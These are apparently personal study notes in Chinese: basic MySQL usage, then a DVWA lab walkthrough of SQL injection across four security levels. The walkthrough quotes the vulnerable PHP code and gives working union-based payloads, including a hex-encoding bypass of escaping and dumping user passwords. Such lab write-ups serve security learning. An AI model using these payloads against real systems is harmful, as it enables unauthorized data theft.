sql基础学习

关系型数据库，非关系型数据库，
	关系型数据库，是说采用了关系模型来组织数据的数据库。关系模型简单的说就是指二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织。典型的如mysql
关系型数据库的优势：1.容易理解，二维表更加贴近逻辑世界的一个概念。2.使用方便 3.关系模式，在数据库中成为表结构
	4.事务的一致性 5.读写的实时型 6.复杂的sql
	关系型数据库的局限性：1.高并发读写需求 2.海量数据的高效率读写 3.高扩展和可用性

非关系型数据库
	非关系型数据库无严格的数据结构，可以处理杂乱的非结构化数据，典型的如mangoDB，redis，
1.key-value类型数据库，具有极高的并发读写性能
2.面向海量数据访问的面向文档数据库 这类数据库的特点 就是在海量的数据中快速的查询数据，manggoDB
3.面向可扩展性的分布式数据库 

熟悉数据库的基本使用，可以自由创建，修改，删除数据库和表

登陆mysql，mysql输入正确的账号密码以及ip地址即可

![image-20190808202419959](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190808202419959.png)

显示当前的数据库

![image-20190808202333446](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190808202333446.png)

创建新的数据库test1

![image-20190808202725032](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190808202725032.png)



使用test数据库

![image-20190808202613050](file:///Users/nixuchuan/Library/Application%20Support/typora-user-images/image-20190808202613050.png?lastModify=1565267243)

创建表student_information 字段 姓名name  性别 sex 年龄age

![image-20190808205202959](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190808205202959.png)

查看表结构

![image-20190809130905317](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190809130905317.png)

插入数据

![image-20190809131407850](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190809131407850.png)

查询数据

![image-20190809131458000](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190809131458000.png)

应该创建数据库的时候选择的字符集的问题，所以导致中文的无法识别，重新输入一组英文名试一下

![image-20190809131653876](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190809131653876.png)

基本上确定是字符集的问题。选择utf-8就可以解决字符的问题

删除数据，这里尝试删除age=12的参数

![image-20190809132044013](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190809132044013.png)

可以看到age=12的记录已经被删除了

![image-20190809132216319](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190809132216319.png)

接下来把其中剩下的一条数据age修改成8

![image-20190809132634917](/Users/nixuchuan/Library/Application Support/typora-user-images/image-20190809132634917.png)

成功将age修改成了8.



sql注入学习

检测是否存在注入

通过注入获取数据

通过注入漏洞获取权限

sql注入检测我这里直接使用dvwa作为实验平台，进行一遍实验，记录实验过程

#Low服务器端核心代码
```
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?> 
```
可以看到，low级别代码对来自客户端的参数id没有进行任何的检查和过滤，存在明显的SQL注入。
漏洞利用
在现实场景中不可能看到后端的代码，所以下面的手动注入步骤是建议在无法看到源码的基础上
1.判断是否存在注入，注入是字符型还是数字型
![image.png](https://upload-images.jianshu.io/upload_images/4267332-cb054e172d7ae7ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
输入```1'or'1'='1```,查询成功。
![image.png](https://upload-images.jianshu.io/upload_images/4267332-f5770bee90b69a83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
输入```1'and'1'='2```,查询失败，返回结果为空
![image.png](https://upload-images.jianshu.io/upload_images/4267332-1fc0552cd938324e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明存在字符型注入
2.猜解SQL查询语句中的字段数
通过order by猜解
输入1‘or 1=1 order by 1 # ,查询成功
![image.png](https://upload-images.jianshu.io/upload_images/4267332-f11bc1d2228c790d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
输入1'or 1=1 order by 2 #,查询成功
![image.png](https://upload-images.jianshu.io/upload_images/4267332-0868a61f17781b0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
继续输入，1'or 1=1 order by 3 #,查询失败
![image.png](https://upload-images.jianshu.io/upload_images/4267332-b1a02732bda0df47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明执行的SQL查询语句中只有两个字段，这里就是First name，Surname。这里也可以通过输入union select 1，2，3...来猜解字段数
3.确定显示的字段顺序
输入1' union select 1,2 #,查询成功。
![image.png](https://upload-images.jianshu.io/upload_images/4267332-a4f93ba45953c954.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明执行的SQL语句为select First name,Surname from table where ID='id'....
4.获取当前数据库
输入1' union select 1,database() #,查询成功；
![image.png](https://upload-images.jianshu.io/upload_images/4267332-163f114a3406431e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
当前数据库为dvwa。
5.获取数据库中的表
输入1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #,查询成功
![image.png](https://upload-images.jianshu.io/upload_images/4267332-bca7a7825927f0e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
当前数据库有两个表，guestbook,users.
6.获取表中的字段名
输入 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #,查询成功。
![image.png](https://upload-images.jianshu.io/upload_images/4267332-1052898954cc3deb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
表中共有八个字段，分别是user_id,first_name,last_name,_user,password,avatar,last_login,failed_login.
7.下载数据
输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #,查询成功
![image.png](https://upload-images.jianshu.io/upload_images/4267332-e4463289bd24ece0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#Medium服务器端核心代码
```
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?> 
```
可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。
![image.png](https://upload-images.jianshu.io/upload_images/4267332-40e5d9a49a22c72c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
漏洞利用
虽然前端使用了下拉选择菜单，但是我们依然可以通过抓包修改参数，提交恶意构造的查询参数。
1.判断是否存在注入，注入是字符型还是数字型，
抓包修改参数id为1' or 1=1 #,报错
![image.png](https://upload-images.jianshu.io/upload_images/4267332-45a2eb7f335f1cde.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
抓包修改参数id为1 or 1=1 #,查询成功
![image.png](https://upload-images.jianshu.io/upload_images/4267332-c0846b0c01cf0279.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明是数字型注入。（由于是数字型注入，所以服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）
2.猜解SQL查询语句中的字段数
抓包修改参数id为1 order by 3 #,报错
![image.png](https://upload-images.jianshu.io/upload_images/4267332-69b4dcb339355545.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明执行的SQL查询语句中国的字段只有两个字段，即这里的First name，Surname。
3.确定显示的字段顺序
抓包更改参数id为 1 union select 1,2 #,查询成功。
![image.png](https://upload-images.jianshu.io/upload_images/4267332-b18794ce19d49782.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明执行的SQL语句为select First name,Surname from 表 where ID=id....
4.获取当前数据库
抓包更改参数id为1 union select 1,database() #,查询成功；
![image.png](https://upload-images.jianshu.io/upload_images/4267332-57d93858d9bee043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明当前的数据库为dvwa。
5.获取数据库中的表
抓包修改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #,查询成功。
![image.png](https://upload-images.jianshu.io/upload_images/4267332-2711daf946fc36b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明数据库dvwa中的两个表，一个guestbook和users
6.获取表中的字段名
抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #,查询失败。
![image.png](https://upload-images.jianshu.io/upload_images/4267332-f6509eb13d82ad4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
因为单引号被转译了，变成了\'。可以利用16进制进行绕过，抓包更改参数id为
1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #
![image.png](https://upload-images.jianshu.io/upload_images/4267332-e6a0143d6a4482f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
说明users表中有八个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
7.下载数据
抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：
![image.png](https://upload-images.jianshu.io/upload_images/4267332-ca92c8e428f26d71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。
#High服务器端核心代码
```
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?> 
```
可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加饿了LIMIT 1，希望以此控制只输出一个结果。
漏洞利用
虽然添加了LIMIT 1，但是我们可以通过#将其注释掉，由于手工注入过程与Low级别差不多，所以直接演示最后一步下载数据，输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #,查询成功

需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。
![](https://upload-images.jianshu.io/upload_images/4267332-73ee36f48ea9c447.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
#Impossible服务器核心代码
```
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```
可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。